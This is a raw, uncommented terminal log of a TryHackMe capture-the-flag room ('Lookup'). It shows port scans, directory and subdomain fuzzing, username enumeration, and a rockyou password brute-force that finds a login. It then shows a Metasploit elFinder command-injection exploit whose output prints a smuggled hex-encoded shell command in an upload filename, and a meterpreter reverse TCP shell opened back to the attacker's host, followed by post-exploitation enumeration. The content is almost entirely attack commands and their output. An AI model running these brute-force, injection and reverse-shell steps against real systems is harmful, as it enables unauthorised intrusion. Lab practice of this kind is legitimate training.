<code>


┌──(kali㉿kali)-[~]
└─$ nmap  -sV -A -Pn 10.10.217.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 11:23 CET
Nmap scan report for 10.10.217.222
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds


https://tryhackme.com/r/room/lookup

┌──(kali㉿kali)-[~/Documents/THM]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://lookup.thm -x php,txt,html 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 719]
/login.php            (Status: 200) [Size: 1]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================


└─$ ffuf -c -w ../../www/wordlists/Subdomain.txt -u  "http://lookup.thm/" -H 'Host: FUZZ.lookup.thm' -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lookup.thm/
 :: Wordlist         : FUZZ: /home/kali/Documents/www/wordlists/Subdomain.txt
 :: Header           : Host: FUZZ.lookup.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 40ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
WWW                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 340ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 43ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 281ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 36ms]
WWW                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 40ms]
WWW                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 38ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
WWW                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 39ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
WWW                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
www                     [Status: 200, Size: 719, Words: 114, Lines: 27, Duration: 37ms]
:: Progress: [649649/649649] :: Job [1/1] :: 544 req/sec :: Duration: [0:11:43] :: Errors: 0 ::


┌──(kali㉿kali)-[~]
└─$  wfuzz -c -z file,./Documents/www/wordlists/usernames_70k_Sq00ky.txt --hs "Wrong username or password. Please try again." -u http://lookup.thm/login.php -d "username=FUZZ&password=admin"
 /home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://lookup.thm/login.php
Total requests: 73317

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                           
=====================================================================

000000002:   200        0 L      8 W        62 Ch       "admin"                                                                           
000000366:   200        0 L      8 W        62 Ch       "jose"                                                                            

Total time: 312.4656
Processed Requests: 73317
Filtered Requests: 73315
Requests/sec.: 234.6402

                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ 06Falcon
06Falcon: command not found
                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -z file,./Documents/www/wordlists/rockyou.txt  --hs "Wrong password. Please try again." -u http://lookup.thm/login.php -d "username=jose&password=FUZZ"  

 /home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://lookup.thm/login.php
Total requests: 14344392

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                           
=====================================================================

000001384:   302        0 L      0 W        0 Ch        "password123"                                                                     
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 5598
Filtered Requests: 5597
Requests/sec.: 0



msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > options

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/       yes       The base path to elFinder
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.22.122   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set lhost 10.9.0.198
lhost => 10.9.0.198
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set rhost 10.10.65.93
rhost => 10.10.65.93
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set vhost files.lookup.thm
vhost => files.lookup.thm
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run

[*] Started reverse TCP handler on 10.9.0.198:4444 
[*] Uploading payload 'o4dOY8Z.jpg;echo 6370202e2e2f66696c65732f6f34644f59385a2e6a70672a6563686f2a202e776d4d64793131666d552e706870 |xxd -r -p |sh& #.jpg' (1976 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.wmMdy11fmU.php) ...
[*] Sending stage (39927 bytes) to 10.10.65.93
[+] Deleted .wmMdy11fmU.php
[*] Meterpreter session 1 opened (10.9.0.198:4444 -> 10.10.65.93:53526) at 2025-01-27 15:22:36 +0100
id
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run

[*] Started reverse TCP handler on 10.9.0.198:4444 
[*] Uploading payload 'PV9keql.jpg;echo 6370202e2e2f66696c65732f5056396b65716c2e6a70672a6563686f2a202e56424f4a54584d64502e706870 |xxd -r -p |sh& #.jpg' (1949 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.VBOJTXMdP.php) ...
[*] Sending stage (39927 bytes) to 10.10.65.93
[+] Deleted .VBOJTXMdP.php
[*] Meterpreter session 2 opened (10.9.0.198:4444 -> 10.10.65.93:53456) at 2025-01-27 15:24:20 +0100
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > pwd
/var/www/files.lookup.thm/public_html/elFinder/php
meterpreter > shell
Process 5642 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
MySQLStorage.sql
autoload.php
connector.minimal.php
editors
elFinder.class.php
elFinderConnector.class.php
elFinderFlysystemGoogleDriveNetmount.php
elFinderPlugin.php
elFinderSession.php
elFinderSessionInterface.php
elFinderVolumeBox.class.php
elFinderVolumeDriver.class.php
elFinderVolumeDropbox.class.php
elFinderVolumeDropbox2.class.php
elFinderVolumeFTP.class.php
elFinderVolumeGoogleDrive.class.php
elFinderVolumeGroup.class.php
elFinderVolumeLocalFileSystem.class.php
elFinderVolumeMySQL.class.php
elFinderVolumeOneDrive.class.php
elFinderVolumeTrash.class.php
elFinderVolumeTrashMySQL.class.php
libs
mime.types
plugins
resources
cd ..
ls
ls: cannot open directory '.': Permission denied
/usr/bin/script -qc /bin/bash /dev/null
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder$ ls
ls
ls: cannot open directory '.': Permission denied
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder$ cd ..
cd ..
www-data@lookup:/var/www/files.lookup.thm/public_html$ cd ..
cd ..
www-data@lookup:/var/www/files.lookup.thm$ ls
ls
public_html
www-data@lookup:/var/www/files.lookup.thm$ ls -la
ls -la
total 12
drwxr-xr-x 3 www-data www-data 4096 Jul 30  2023 .
drwxr-xr-x 5 root     root     4096 Jan 11  2024 ..
drwxr-xr-x 3 www-data www-data 4096 May 13  2024 public_html
www-data@lookup:/var/www/files.lookup.thm$ cd ..
cd ..
www-data@lookup:/var/www$ ls
ls
files.lookup.thm  html  lookup.thm
www-data@lookup:/var/www$ cd ..
cd ..
www-data@lookup:/var$ ls
ls
backups  crash  local  log   opt  snap   tmp
cache    lib    lock   mail  run  spool  www
www-data@lookup:/var$ cd ..
cd ..
www-data@lookup:/$ ls
ls
bin   etc   lib32   lost+found  opt   run        snap      sys  var
boot  home  lib64   media       proc  sbin       srv       tmp
dev   lib   libx32  mnt         root  seddc5fn0  swap.img  usr
www-data@lookup:/$ cd home
cd home
www-data@lookup:/home$ ls
ls
think
www-data@lookup:/home$ cd think
cd think
www-data@lookup:/home/think$ ls
ls
user.txt
www-data@lookup:/home/think$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@lookup:/home/think$ 





<\code>
